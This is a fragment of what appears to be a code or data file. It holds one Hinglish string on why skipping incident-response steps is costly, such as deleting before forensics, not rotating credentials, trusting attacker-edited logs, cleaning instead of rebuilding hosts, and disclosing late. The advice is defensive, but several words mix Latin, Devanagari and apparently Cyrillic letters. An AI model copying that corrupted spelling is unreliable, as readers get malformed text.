      'STEPS SKIP KARNE KI COST: delete-first forensics khो deता hai + persistence chhodता hai; skip-rotation copied short-lived creds ko re-enter karने ke liye kaafi der live chhodता hai; investigate-from-prod-logs ek record analyse karता hai jise attacker ne edit kiya; clean-not-rebuild ka matlab wo us raat wapas hain (aap ek compromised host ko clean saabit nahi kar sakte); late/vague disclosure ek contained incident ko breach se worse ek regulatory finding banаता hai.',
    ],
  },
];
